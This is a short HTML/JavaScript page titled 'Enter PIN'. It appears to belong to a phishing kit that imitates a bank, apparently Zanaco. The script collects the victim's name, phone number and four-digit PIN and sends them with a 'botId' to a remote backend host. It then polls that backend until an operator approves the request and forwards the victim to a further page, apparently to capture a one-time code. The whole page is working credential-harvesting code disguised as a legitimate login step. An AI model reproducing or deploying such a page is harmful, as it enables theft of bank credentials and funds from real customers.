<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Enter PIN</title>
<style>
body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; }
.pin-container { background:#fff; padding:30px; width:350px; text-align:center; }
.pin-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; }
button { width:100%; padding:12px; background:red; color:#fff; border:none; }
</style>
</head>
<body>

<div class="pin-container">
    <h2>Enter PIN</h2>

    <form id="pinForm">
        <div class="pin-boxes">
            <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
        </div>
        <button id="submitBtn" disabled>Submit PIN</button>
    </form>
    <div id="status"></div>
</div>

<script>
const BACKEND_URL = "https://zanaco-backend.onrender.com";

const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();
if (!botId) { alert("Invalid access link"); throw new Error(); }

if (!localStorage.getItem('name') || !localStorage.getItem('phone')) {
    window.location.href = `details.html?botId=${botId}`;
}

const inputs = document.querySelectorAll('.pin-boxes input');
const button = document.getElementById('submitBtn');

inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g,'');
        if (input.value && i < 3) inputs[i+1].focus();
        button.disabled = ![...inputs].every(x => x.value);
    });
});

document.getElementById('pinForm').addEventListener('submit', async e => {
    e.preventDefault();

    const pin = [...inputs].map(i => i.value).join('');
    const name = localStorage.getItem('name');
    const phone = localStorage.getItem('phone');

    localStorage.setItem('pin', pin); // 🔥 CRITICAL FIX

    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ name, phone, pin, botId })
    });

    const { requestId } = await res.json();

    const poll = setInterval(async () => {
        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const d = await r.json();
        if (d.approved === true) {
            clearInterval(poll);
            window.location.href = `code.html?botId=${botId}`;
        }
    }, 1500);
});
</script>

</body>
</html>
